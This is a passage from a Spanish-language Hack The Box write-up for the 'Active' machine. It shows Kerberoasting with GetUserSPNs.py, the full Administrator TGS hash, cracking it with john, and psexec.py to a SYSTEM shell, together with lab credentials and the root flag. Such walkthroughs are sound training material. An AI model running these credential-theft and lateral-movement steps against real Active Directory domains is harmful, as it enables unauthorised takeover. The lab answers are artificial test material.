2023/07/30 21:31:59 >  	10.10.10.100:88

2023/07/30 21:33:39 >  Done! Tested 10177 usernames (0 valid) in 99.437 seconds

```

- En este caso no encontró nada por ese kerbrute, entonces usamos GetUsersSPNs.py para verificar si existen usuarios Kerberoestables , si no lo tienen lo pueden encontrar en la siguiente pagina:

[https://github.com/fortra/impacket/blob/master/examples/GetUserSPNs.py](https://github.com/fortra/impacket/blob/master/examples/GetUserSPNs.py)

```ruby
❯ GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18 2>/dev/null
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 14:06:40.351723  2023-07-30 19:04:52.088977             

```

- Vemos que el usuario Administrator es kerberoestable, por lo que podemos obtener un `ticket granting service`

Un Ticket Granting Service (TGS), que se traduce al español como "Servicio de Concesión de Tickets", es un componente fundamental en el protocolo de autenticación Kerberos. Kerberos es un protocolo de red que proporciona una forma segura de autenticación entre clientes y servicios en una red.

Cuando un cliente desea acceder a un servicio en un sistema que utiliza Kerberos para la autenticación, primero debe obtener un Ticket de Concesión de Servicio (TGT) del servidor de autenticación, también conocido como Key Distribution Center (KDC). El TGT es un ticket de seguridad que el cliente utiliza para demostrar su identidad ante el TGS.

Una vez que el cliente tiene el TGT, puede presentarlo al Ticket Granting Service (TGS) para solicitar un Ticket de Servicio (Service Ticket) para el servicio al que desea acceder. El TGS es responsable de verificar la validez del TGT y, si es válido, emite un Ticket de Servicio al cliente.

El Ticket de Servicio es un token que contiene información cifrada sobre la identidad del cliente y el servicio al que desea acceder. Este ticket es enviado al servicio solicitado, que puede verificarlo con la ayuda del TGS. Si el Ticket de Servicio es válido, el cliente obtiene acceso al servicio sin necesidad de transmitir su nombre de usuario y contraseña nuevamente.

```ruby
❯ GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18 -request 2>/dev/null
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 14:06:40.351723  2023-07-30 19:04:52.088977             



[-] CCache file is not found. Skipping...
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$b3fc0e34830f6771012c3fd52c2723d2$3aaf8e2c31da65eb769c97490d8e37d9b994e50c4baecee8959d88d031d21fa1fcb52e29318cc5bbb577f992cf2c1c616f46d0442caa4bad3e3b1ce758d203937bbca87c85e1ccb574ba0e5812be4ffff47bdf23478b3b12955a3f8c37d2158287ffa39c98555a6c89b0b45ff757a4fdc450ebf04c5be928ee391a26ba8fe8288b944690e638c4305e2d5542feba8feec6d340cf350ca3e0b8e0b80e8dff0217404c6b449bdca837cc426340f6127904e96c8dd05b9e5944430df4b413c5574dbe8f124e69aa655cb7bea0d248faf3d6682e5a7371c1429f7ede71496021a03b0bc1692bdee85f68fca9e8afd5c9dbbbf7f07bea701201e28163f8541983a5280c8e46a15a386ea5eeda1b7a886a18b020222249cb20d581bb538252020391466da3f296a278f0cb1a6f00bb48266b7a3a0bb938232010104f377a837a58a553381d0eec46585b76f1481fd41905540da4df41ed4abfe92f0f0f7416ac89cd444c185b8fd09323a2e90084f0cf2cb919491b48c6fea866d8cc3bc8fe33fd31414fc23b3dff0cce0cc087a01b143efa12b9ae5172ddb5b83aca299b83c98773922ea8963eacc13f72c03a3e039f561303dff3bafe9c1e2907f5307f4f5cef4acd0a699d43ae91d7cbfc13ba5ad9516d85039dff92ba299298db7ad796be11acb7c39ed7251b022c85505236d48b743981ca529232cb695c85bc3eb93e2fcb74a4609f69ceeab26561374106a55c30115a981e8eb82e7915ad3849c42b71f1503e7f22f9818e64b2e7321227f646a8e680a0a7268d8afa5d8a89aa44fe419c31a81eb7e1d31e1946fbe2161db273d26fb8ecd544d2d11fe60a6619c0af786def7c74d385980407d2f82758b91883f3c1fa64f350dc4e8038b4c5f448f348e1237c3ae9204d2b95c3b9904e2e7581d02a43f3f53fe4206ae17a4cd3ff8ce161f8d6aa1fabbf8bd435475d4906ce8415a7aac12f72e039567980991294c02be1189e53d6bc18b8623d33b5380456365983c087fe39c5ba3ab92b3f9f9db1143307f386b23834ca7c2f8eba0defd65e92ef4735327afea22e4bc452c71b0450aee9282d0d29fa0b2d22684eefddb0e5f469d7df5d2099bdef7ed0e9ba32ef4008240ffbfe643f94ff73e0ee035fdd34a801406854d0c06c720c175e2b5c0692aa2362d2ffaece511dd3fc9b59a7751834c68274935c7fb69b9eb3db26ff050ca21698b95607f969ae1b2ba97faf9d6d6b141769d8427570d1e7e37683
```

- Los que nos da es un hash que ahora de manera offline podemos tratar de crakear, si logramos romperla la contraseña que nos va a dar es la del usuario Administrator.
- Nos creamos un archivo llamado hash `nvim hash` y con la herramineta `john` vamos a tratar de romperla.

```ruby
❯ john -w:/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Ticketmaster1968 (?)
1g 0:00:00:04 DONE (2023-07-30 22:07) 0.2433g/s 2564Kp/s 2564Kc/s 2564KC/s Tiffani1432..Thing1
Use the "--show" option to display all of the cracked passwords reliably
Session completed

```
- Tenemos la contraseña Ticketmaster1968 vamos a probarla.

```ruby
❯ crackmapexec smb 10.10.10.100 -u 'Administrator' -p 'Ticketmaster1968'
SMB         10.10.10.100    445    DC               [*] Windows 6.1 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.100    445    DC               [+] active.htb\Administrator:Ticketmaster1968 (Pwn3d!)

```

- Como ya logramos pwnearnos buscaremos tener acceso al sistema

```ruby
❯ psexec.py active.htb/Administrator:Ticketmaster1968@10.10.10.100 cmd.exe
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Requesting shares on 10.10.10.100.....
[*] Found writable share ADMIN$
[*] Uploading file fUoddUaL.exe
[*] Opening SVCManager on 10.10.10.100.....
[*] Creating service DbSK on 10.10.10.100.....
[*] Starting service DbSK.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>
```

```ruby
C:\Windows\system32>whoami
nt authority\system

C:\Windows\system32>

```

- Estamos dentro de la máquina 
- Obtenemos la flag de root 

```ruby
C:\>type C:\Users\Administrator\Desktop\root.txt
19122dbe3f7c4293a4f396bc6b3afbe8
```

<h3 style="text-align:center" id="autores-y-referencias">AUTORES y REFERENCIAS</h3><hr>

Autor del write up: John Osorio (Balthael) <a href="https://app.hackthebox.com/profile/1366059" target="_blank">HTB</a>. Si quieres contactarme por cualquier motivo lo puedes hacer a través de <a href="https://www.instagram.com/joh_sb/" target="_blank">Instagram</a>.

Autor de la máquina:  <em>eks & mrb3n</em>, muchas gracias por la creación de Active, la disfrute mucho. <a href="https://app.hackthebox.com/users/302" target="_blank">HTB</a>.
